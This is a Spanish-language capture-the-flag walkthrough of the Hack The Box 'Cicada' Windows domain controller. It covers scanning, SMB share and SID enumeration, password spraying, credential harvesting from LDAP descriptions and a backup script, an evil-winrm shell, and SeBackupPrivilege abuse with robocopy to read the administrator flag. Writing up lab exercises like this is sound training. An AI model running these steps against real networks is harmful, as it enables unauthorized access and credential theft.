--------------
- Tags: #facil #htb #windows #terminada 

--------------------
1. Comprobamos la conexión y a que sistema nos estamos enfrentando con ping:

```bash
┌──(mili㉿kali)-[~/Desktop/HTB/Cicada]
└─$ ping -c 1 10.10.11.35      
PING 10.10.11.35 (10.10.11.35) 56(84) bytes of data.
64 bytes from 10.10.11.35: icmp_seq=1 ttl=127 time=40.2 ms

--- 10.10.11.35 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 40.152/40.152/40.152/0.000 ms
```

Windows por TTL de 127 y hay conexión.

2. Escaneo de puertos general

```bash
┌──(mili㉿kali)-[~/Desktop/HTB/Cicada]
└─$ sudo nmap -sS --allports --min-rate 5000 -vv 10.10.11.35 -Pn -oG allports
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 19:15 CEST
Initiating Parallel DNS resolution of 1 host. at 19:15
Completed Parallel DNS resolution of 1 host. at 19:15, 0.00s elapsed
Initiating SYN Stealth Scan at 19:15
Scanning 10.10.11.35 (10.10.11.35) [1000 ports]
Discovered open port 139/tcp on 10.10.11.35
Discovered open port 445/tcp on 10.10.11.35
Discovered open port 135/tcp on 10.10.11.35
Discovered open port 53/tcp on 10.10.11.35
Discovered open port 88/tcp on 10.10.11.35
Discovered open port 389/tcp on 10.10.11.35
Discovered open port 593/tcp on 10.10.11.35
Discovered open port 3268/tcp on 10.10.11.35
Discovered open port 636/tcp on 10.10.11.35
Discovered open port 3269/tcp on 10.10.11.35
Discovered open port 464/tcp on 10.10.11.35
Completed SYN Stealth Scan at 19:15, 0.53s elapsed (1000 total ports)
Nmap scan report for 10.10.11.35 (10.10.11.35)
Host is up, received user-set (0.041s latency).
Scanned at 2024-09-30 19:15:23 CEST for 0s
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE          REASON
53/tcp   open  domain           syn-ack ttl 127
88/tcp   open  kerberos-sec     syn-ack ttl 127
135/tcp  open  msrpc            syn-ack ttl 127
139/tcp  open  netbios-ssn      syn-ack ttl 127
389/tcp  open  ldap             syn-ack ttl 127
445/tcp  open  microsoft-ds     syn-ack ttl 127
464/tcp  open  kpasswd5         syn-ack ttl 127
593/tcp  open  http-rpc-epmap   syn-ack ttl 127
636/tcp  open  ldapssl          syn-ack ttl 127
3268/tcp open  globalcatLDAP    syn-ack ttl 127
3269/tcp open  globalcatLDAPssl syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.60 seconds
           Raw packets sent: 1989 (87.516KB) | Rcvd: 11 (484B)
```

3. Escaneo de versiones de los servicios:

```bash
┌──(mili㉿kali)-[~/Desktop/HTB/Cicada]
└─$ nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269 10.10.11.35 -Pn -oN escaneo
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 19:21 CEST
Stats: 0:00:39 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 90.91% done; ETC: 19:22 (0:00:04 remaining)
Nmap scan report for 10.10.11.35 (10.10.11.35)
Host is up (0.041s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-01 00:21:51Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m59s
| smb2-time: 
|   date: 2024-10-01T00:22:34
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.54 seconds
```

3. Enumeramos servicio SMB

```bash
=================================( Getting domain SID for 10.10.11.35 )=================================

Domain Name: CICADA
Domain Sid: S-1-5-21-917908876-1423158569-3159038727

[+] Host is part of a domain (not a workgroup)
```

No permite NULL o sesiones de invitado.

4. Podemos añadir el dominio CICADA-DC y cicada.htb

```bash
127.0.0.1       localhost
127.0.1.1       kali
10.10.11.35     CICADA-DC.cicada.htb cicada.htb
```

5. SMB

Podemos utilizar una herramienta nacida junto con crackmapexec, que es nxc

```bash
┌──(mili㉿kali)-[~/Desktop/HTB/Cicada/rpcenum]
└─$ nxc smb 10.10.11.35 -u 'guest' -p ''         
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\guest:
```

```bash
┌──(mili㉿kali)-[~/Desktop/HTB/Cicada/rpcenum]
└─$ nxc smb 10.10.11.35 -u 'guest' -p '' --shares
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\guest: 
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
SMB         10.10.11.35     445    CICADA-DC        DEV                             
SMB         10.10.11.35     445    CICADA-DC        HR              READ            
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON                        Logon server share 
SMB         10.10.11.35     445    CICADA-DC        SYSVOL                          Logon server share 
```

Hay 2 interesantes HR y DEV.

Ahora con smbcliente seguimos con la enumeración:

```bash
┌──(mili㉿kali)-[~/Desktop/HTB/Cicada/rpcenum]
└─$ smbclient //10.10.11.35/HR
Password for [WORKGROUP\mili]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Mar 14 13:29:09 2024
  ..                                  D        0  Thu Mar 14 13:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 19:31:48 2024

                4168447 blocks of size 4096. 315476 blocks available
smb: \> get "Notice from HR.txt"
```

```bash
┌──(mili㉿kali)-[~/Desktop/HTB/Cicada]
└─$ cat Notice\ from\ HR.txt 

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: "Cicada$M6Corpb*@Lp#nZp!8"

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

Nos dan una contraseña pero no sabemos para que usuario servirá, así que, tendremos que enumerar una lista de todos los usuarios posibles, para ver cual es el correcto.

```bash
┌──(mili㉿kali)-[~/Desktop/HTB/Cicada]
└─$ python3 lookupsid.py guest@10.10.11.35 -no-pass
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Brute forcing SIDs at 10.10.11.35
[*] StringBinding ncacn_np:10.10.11.35[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-917908876-1423158569-3159038727
498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: CICADA\Administrator (SidTypeUser)
501: CICADA\Guest (SidTypeUser)
518: CICADA\Schema Admins (SidTypeGroup)
519: CICADA\Enterprise Admins (SidTypeGroup)
520: CICADA\Group Policy Creator Owners (SidTypeGroup)
521: CICADA\Read-only Domain Controllers (SidTypeGroup)
522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
525: CICADA\Protected Users (SidTypeGroup)
526: CICADA\Key Admins (SidTypeGroup)
527: CICADA\Enterprise Key Admins (SidTypeGroup)
553: CICADA\RAS and IAS Servers (SidTypeAlias)
571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
1000: CICADA\CICADA-DC$ (SidTypeUser)
1104: CICADA\john.smoulder (SidTypeUser)
1105: CICADA\sarah.dantelia (SidTypeUser)
1106: CICADA\michael.wrightson (SidTypeUser)
1108: CICADA\david.orelious (SidTypeUser)
1109: CICADA\Dev Support (SidTypeGroup)
1601: CICADA\emily.oscars (SidTypeUser)
```

Después con nxc podemos hacer un poco de fuerza bruta para ver que usuario es el correcto:

```bash
┌──(mili㉿kali)-[~/Desktop/HTB/Cicada]
└─$ nxc smb 10.10.11.35 -u user.list -p 'Cicada$M6Corpb*@Lp#nZp!8'
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [-] CICADA\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] CICADA\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] CICADA\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] CICADA\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] CICADA\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] CICADA\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [+] CICADA\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
```

Y comprobamos que el usuario es michael.

```bash
┌──(mili㉿kali)-[~/Desktop/HTB/Cicada/dumpadmin]
└─$ ldapdomaindump ldap://10.10.11.35 -u 'CICADA\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
                                                                                                                                                                                             
┌──(mili㉿kali)-[~/Desktop/HTB/Cicada/dumpadmin]
└─$ cat domain_users.json
```

Utilizamos ldapdomaindump para tener un volcado del servicio ldap y vemos algo interesante en domain_users.

```bash
"cn": [
            "David Orelious"
        ],
        "codePage": [
            0
        ],
        "countryCode": [
            0
        ],
        "dSCorePropagationData": [
            "2024-08-28 17:25:57+00:00",
            "2024-08-22 17:39:38+00:00",
            "2024-03-14 18:15:31+00:00",
            "2024-03-14 17:29:56+00:00",
            "1601-07-14 22:41:04+00:00"
        ],
        "description": [
            "Just in case I forget my password is aRt$Lp#7t*VQ!3"
```

La password de David, por lo que ahora podremos conectarnos con smbclient:

```bash
┌──(mili㉿kali)-[~/Desktop/HTB/Cicada]
└─$ smbclient -U david.orelious //cicada.htb/DEV
Password for [WORKGROUP\david.orelious]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Mar 14 13:31:39 2024
  ..                                  D        0  Thu Mar 14 13:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 19:28:22 2024

                4168447 blocks of size 4096. 337433 blocks available
smb: \> get Backup_script.ps1 
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (3.6 KiloBytes/sec) (average 3.6 KiloBytes/sec)
```

```bash
┌──(mili㉿kali)-[~/Desktop/HTB/Cicada]
└─$ cat Backup_script.ps1                      

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

Y encontramos la pass de Emily, con la que podremos utilizar evil-winrm:

```bash
┌──(mili㉿kali)-[~/Desktop/HTB/Cicada]
└─$ evil-winrm -i 'cicada.htb' -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
   
Evil-WinRM shell v3.5
  
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
    
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
   
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents>
```

Flag User:
```bash
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> ls


    Directory: C:\Users\emily.oscars.CICADA\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         9/30/2024  11:42 PM             34 user.txt
```

Se encuentra en el escritorio. Ahora hay que escalar privilegios:

```bash
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop>
```

Aquí podemos ver nuestros privilegios y podemos observar un SeBackupPrivilege: https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/ del cual he encontrado información.

Primero he creado un directorio tmp para poder almacenar la flag y he usado la herramienta robocopy para exfiltrar la flag del root pudiendo leerla sin problema:

```bash
*Evil-WinRM* PS C:\Users\tmp> robocopy /b C:\Users\Administrator\Desktop . root.txt

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Tuesday, October 1, 2024 12:41:31 AM
   Source : C:\Users\Administrator\Desktop\
     Dest : C:\Users\tmp\

    Files : root.txt

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    C:\Users\Administrator\Desktop\
            New File                  34        root.txt
  0%
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :        34        34         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
   Ended : Tuesday, October 1, 2024 12:41:31 AM

*Evil-WinRM* PS C:\Users\tmp> ls


    Directory: C:\Users\tmp


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         9/30/2024  11:42 PM             34 root.txt


*Evil-WinRM* PS C:\Users\tmp> type root.txt
091caa2**************0a7c9c7045
```